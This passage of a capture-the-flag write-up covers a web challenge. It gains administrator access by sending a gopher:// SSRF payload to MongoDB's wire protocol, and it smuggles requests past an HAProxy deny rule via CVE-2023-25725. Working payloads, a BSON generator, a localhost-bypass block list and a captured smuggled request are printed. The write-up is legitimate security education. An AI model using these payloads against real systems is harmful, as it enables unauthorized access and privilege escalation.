</code></pre></div><p>As can be seen, the <code>/register</code> endpoint sets our permission to <code>user</code>. We would like to have <code>administrator</code> because we need to pass this <code>AdminMiddleware</code> to continue with the exploitation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.permission </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">"administrator"</span><span class="mtk1">) {</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Not allowed"</span><span class="mtk1">});</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">};</span>
</code></pre></div><p>It is worth mentioning that the <code>/login</code> endpoint is vulnerable to NoSQL injection because the <code>username</code> and <code>password</code> parameters are sent directly to MongoDB, withouth checking if they are strings. However, this is useless because the database is empty at the beginning, so we can&rsquo;t simply log in as <code>administrator</code>.</p><p>There are two interesting endpoints that allow us to perform requests to a given URL (<code>challenge/routes/generic.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> axios </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"axios"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">Router</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> authMiddleware </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"../middleware/auth"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { check, getUrlStatusCode } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"../util/generic"</span><span class="mtk1">);</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/healthcheck"</span><span class="mtk1">, authMiddleware, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">targetUrl</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">.url;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">targetUrl</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Mandatory URL not specified"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">check</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">403</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Access to URL is denied"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  axios.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">, { </span><span class="mtk1">maxRedirects</span><span class="mtk1">: </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk8">validateStatus</span><span class="mtk1">: () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">, </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">40000</span><span class="mtk1"> })</span>  
<span class="mtk1">    .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">resp</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk9 mtki">resp</span><span class="mtk1">.status).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    })</span>
<span class="mtk1">    .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/healthcheck-dev"</span><span class="mtk1">, authMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">targetUrl</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">.url;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">targetUrl</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Mandatory URL not specified"</span><span class="mtk1"> });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">getUrlStatusCode</span><span class="mtk1">(</span><span class="mtk1">targetUrl</span><span class="mtk1">)</span>
<span class="mtk1">    .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">statusCode</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk9 mtki">statusCode</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    })</span>
<span class="mtk1">    .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    });</span>
<span class="mtk1">});</span>

<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
</code></pre></div><p>Both endpoints are quite similar, but there are a few differences. On the one hand, <code>/healthcheck</code>:</p><ul><li>Uses <code>axios</code>, which is a library that allows using <code>http</code>, <code>https</code>, <code>file</code> and <code>data</code> schemes (more information at <a href="https://github.com/axios/axios/blob/main/lib/platform/node/index.js">axios</a>)</li><li><code>axios</code> is configured with <code>maxRedirects = 0</code></li><li>We will only get the HTTP status code as an output</li><li>The URL is checked using the following function:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">exports</span><span class="mtk1">.</span><span class="mtk8">check</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">url</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">URL</span><span class="mtk1">(</span><span class="mtk9 mtki">url</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isNaN</span><span class="mtk1">(</span><span class="mtk7">parseInt</span><span class="mtk1">(</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1">))) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"1337"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"3000"</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">pathname</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">().</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk4">"healthcheck"</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">bad</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk4">"localhost"</span><span class="mtk1">, </span><span class="mtk4">"127"</span><span class="mtk1">, </span><span class="mtk4">"0177"</span><span class="mtk1">, </span><span class="mtk4">"000"</span><span class="mtk1">, </span><span class="mtk4">"0x7"</span><span class="mtk1">, </span><span class="mtk4">"0x0"</span><span class="mtk1">, </span><span class="mtk4">"@0"</span><span class="mtk1">, </span><span class="mtk4">"[::]"</span><span class="mtk1">, </span><span class="mtk4">"0:0:0"</span><span class="mtk1">, </span><span class="mtk4">"①②⑦"</span><span class="mtk1">];</span>  
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">bad</span><span class="mtk1">.</span><span class="mtk8">some</span><span class="mtk1">(</span><span class="mtk9 mtki">w</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">parsed</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">().</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk9 mtki">w</span><span class="mtk1">))) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>On the other hand, we have <code>/healthcheck-dev</code>:</p><ul><li>It does not check the URL</li><li>It runs <code>curl</code> with especific parameters, so that we only get the HTTP status code:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">exports</span><span class="mtk1">.</span><span class="mtk8">getUrlStatusCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">url</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">((</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">curlArgs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk4">"-L"</span><span class="mtk1">, </span><span class="mtk4">"-I"</span><span class="mtk1">, </span><span class="mtk4">"-s"</span><span class="mtk1">, </span><span class="mtk4">"-o"</span><span class="mtk1">, </span><span class="mtk4">"/dev/null"</span><span class="mtk1">, </span><span class="mtk4">"-w"</span><span class="mtk1">, </span><span class="mtk4">"%{http_code}"</span><span class="mtk1">, </span><span class="mtk9 mtki">url</span><span class="mtk1">];</span>  
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk8">execFile</span><span class="mtk1">(</span><span class="mtk4">"curl"</span><span class="mtk1">, </span><span class="mtk1">curlArgs</span><span class="mtk1">, (</span><span class="mtk9 mtki">error</span><span class="mtk1">, </span><span class="mtk9 mtki">stdout</span><span class="mtk1">, </span><span class="mtk9 mtki">stderr</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">error</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">error</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">statusCode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">parseInt</span><span class="mtk1">(</span><span class="mtk9 mtki">stdout</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">statusCode</span><span class="mtk1">);</span>
<span class="mtk1">    });</span>
<span class="mtk1">  });</span>
<span class="mtk1">}</span>
</code></pre></div><p>However, there is an HA-Proxy in front of the Express server, which explicitly blocks any request to <code>/healthcheck-dev</code> (<code>conf/haproxy.conf</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">global
    log /dev/log local0
    log /dev/log local1 notice
    maxconn 4096
    user haproxy
    group haproxy
defaults
    mode http
    timeout connect 5000
    timeout client 10000
    timeout server 10000
frontend http-in
    bind *:1337
    default_backend forward_default
backend forward_default
    http-request deny if { path -i -m beg /healthcheck-dev }  
    server s1 127.0.0.1:3000
</code></pre></div><p>Basically, we have this structure:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-2.webp" alt="Percetron 2"></p><p>We can leave the source code analysis here until we have an user with <code>administrator</code> permission.</p><h2 id="ssrf-exploitation">SSRF Exploitation</h2><p>The objective here is to insert an <code>administrator</code> user into MongoDB. For this, we must use Server-Side Request Forgery (SSRF) with one of the endpoints <code>/healthcheck</code> or <code>/healthcheck-dev</code>.</p><h3 id="mongodb-wire-protocol">MongoDB Wire Protocol</h3><p>While investigating how to perform SSRF to MongoDB, I found a <a href="https://brycec.me/posts/dicectf_2023_challenges#unfinished">write-up from DiceCTF 2023</a> that used <a href="https://www.mongodb.com/docs/v3.4/reference/mongodb-wire-protocol/">MongoDB Wire Protocol</a> using <code>telnet</code>. I took the script to generate the BSON payload from there and modified the query to insert an <code>administrator</code> user (password is <code>asdf</code> hashed with <code>bcrypt</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> BSON </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'bson'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'fs'</span><span class="mtk1">);</span>

<span class="mtk3">// Serialize a document</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">doc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk1">insert</span><span class="mtk1">: </span><span class="mtk4">"users"</span><span class="mtk1">, </span><span class="mtk1">$db</span><span class="mtk1">: </span><span class="mtk4">"percetron"</span><span class="mtk1">, </span><span class="mtk1">documents</span><span class="mtk1">: [{</span>
<span class="mtk1">    </span><span class="mtk4">"username"</span><span class="mtk1">: </span><span class="mtk4">"administrator"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"password"</span><span class="mtk1">: </span><span class="mtk4">"$2a$10$yPklsGI8uhnptd0TP.rUBuwFM1yLjnguL3bTaQ7j3q</span><span class="mtk4">WFsUIbUKbUC"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"permission"</span><span class="mtk1">: </span><span class="mtk4">"administrator"</span><span class="mtk1">,</span>
<span class="mtk1">}]};</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> BSON.</span><span class="mtk8">serialize</span><span class="mtk1">(</span><span class="mtk1">doc</span><span class="mtk1">);</span>

<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">beginning</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk4">"5D0000000000000000000000DD0700000000000000"</span><span class="mtk1">, </span><span class="mtk4">"hex"</span><span class="mtk1">);</span>  
<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">full</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">concat</span><span class="mtk1">([</span><span class="mtk1">beginning</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1">]);</span>

<span class="mtk1">full</span><span class="mtk1">.</span><span class="mtk8">writeUInt32LE</span><span class="mtk1">(</span><span class="mtk1">full</span><span class="mtk1">.</span><span class="mtk7">length</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">writeFileSync</span><span class="mtk1">(</span><span class="mtk4">"bson.bin"</span><span class="mtk1">, </span><span class="mtk1">full</span><span class="mtk1">);</span>
</code></pre></div><p>At this point, on the <a href="https://brycec.me/posts/dicectf_2023_challenges#unfinished">write-up</a> they used <code>curl</code> with <code>telnet://</code> scheme to send the payload as a request body. This time, we can&rsquo;t do that because <code>/healthcheck-dev</code> runs <code>curl</code> with no data, just the URL.</p><h3 id="gopher-protocol">Gopher protocol</h3><p>But I remember from previous editions of HTB Cyber Apocalypse that <code>curl</code> supports <code>gopher://</code> scheme, so we can perform the same thing by using this URL:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%72%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00  
</code></pre></div><p>We can check that it works inside the Docker container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> ps -a | <span class="code-dark-green">grep</span> percetron
67a4897960f1   web_<span class="code-red">percetron</span>                     "/entrypoint.sh"         9 minutes ago   Up 9 minutes              0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp   web_<span class="code-red">percetron</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> exec -it 67a4897960f1 sh
/app # mongo percetron --eval 'db.users.find().pretty()' --quiet
{
        "_id" : ObjectId("65f2e6e2a642b8770e443027"),
        "username" : "asdf",
        "password" : "$2a$10$t8DVP9VhCCqz5tyEIBDcNevEYWfc2UPHXNTZKBVNaojbjlQn4OHuO",
        "permission" : "user",
        "__v" : 0
}
/app # curl gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%7
2%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%
00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74
%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%0
0%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: &lt;FILE&gt;" to save to a file.
/app # mongo percetron --eval 'db.users.find().pretty()' --quiet
{
        "_id" : ObjectId("65f2e6e2a642b8770e443027"),
        "username" : "asdf",
        "password" : "$2a$10$t8DVP9VhCCqz5tyEIBDcNevEYWfc2UPHXNTZKBVNaojbjlQn4OHuO",
        "permission" : "user",
        "__v" : 0
}
{
        "_id" : ObjectId("65f2e84e82006b0cb78b8168"),
        "username" : "administrator",
        "password" : "$2a$10$yPklsGI8uhnptd0TP.rUBuwFM1yLjnguL3bTaQ7j3qWFsUIbUKbUC",
        "permission" : "administrator"
}
</code></pre></div><p>Perfect, so we see that we need to reach <code>/healthchec-dev</code>, because <code>axios</code> does not support <code>gopher://</code>.</p><h3 id="failed-attempts">Failed attempts</h3><p>One idea we had is to somehow try to perform SSRF from <code>/healthcheck</code> to <code>/healthcheck-dev</code>. But this is not possible because the <code>check</code> function will block us and also, the request does not carry our session cookie, so <code>AuthMiddleware</code> will block the request to <code>/healthcheck-dev</code>.</p><p>Therefore, we must bypass the HA-Proxy. One option is to try to confuse URL parsers, so that HA-Proxy does not catch <code>/healthcheck-dev</code> but Express does. After several paths like <code>//healthcheck-dev</code> or <code>/./healtcheck-dev</code>, among other similar payloads, we found that it is not possible in Express.</p><h3 id="http-request-smuggling">HTTP request smuggling</h3><p>Another thing to consider is the version of HA-Proxy. The Docker container is using an <code>haproxy:2.3-alpine</code> image. The especific version is 2.3.21:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # haproxy -v
HA-Proxy version 2.3.21-3ce4ee0 2022/07/27 - https://haproxy.org/
Status: End of life - please upgrade to branch 2.4.
Known bugs: http://www.haproxy.org/bugs/bugs-2.3.21.html
Running on: Linux 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64  
</code></pre></div><p>If we take a look at the URL above, we will see that there are no known bugs, but if we try simply <a href="http://www.haproxy.org/bugs/bugs-2.3.html">2.3</a>, we will see a lot. Also, if we search for vulnerabilities of HA-Proxy version 2.3, we will see a lot of CVE that might be exploitable. However, only a few of them had proof of concepts, and they didn&rsquo;t work.</p><p>The CVE that finally worked is <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25725">CVE-2023-25725</a> which may result in HTTP request smuggling. This exploit will allow us to send one request to HA-Proxy that is interpreted as two requests by Express. As a result, we can embed the request to <code>/healthcheck-dev</code> and perform the above query to MongoDB.</p><p>The main problem we had here is that there are no proof of concepts on this CVE. We only had the <a href="https://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=a8598a2">Git issue</a> with an example. We actually downloaded the HA-Proxy source code that is running in the Docker container and checked that the fixes are not there. So, we confirmed that the HA-Proxy was vulnerable to this.</p><p>While testing some HTTP request smuggling techniques in Burp-Suite, I ran <code>tcpdump</code> inside the container to see how the HTTP messages were arriving to Express:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-3.webp" alt="Percetron 3"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # tcpdump -i lo tcp port 3000 -w -
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
e0JE&lt;@@8
        HR&gt;0
]'e0JE&lt;@@&lt;
          4~HR?0
]']'e0BE4@@8
            HR?4~р(
]']'e-1@E2@@7
             HR?4~р&
]']'POST /panel/login HTTP/1.1
host: 127.0.0.1:1337
transfer-encoding: chunked

A3
GET /healthcheck-dev HTTP/1.1
Host: 127.0.0.1:3000
Cookie: connect.sid=s%3AlPQ3OEP-p97KH2kOWLgzS5zV6lJ75683.sfnADEVOu%2BufjwtP8W%2B8vY7kfgcQpUU83EqY%2FXeMLL0


0

e11BE4@@~
         4~HS=(
]']'eE@@y\
          4~HS=
]']'HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1060
ETag: W/"424-qLUzAi9KX/2MAcYPkCsictUtg4A"
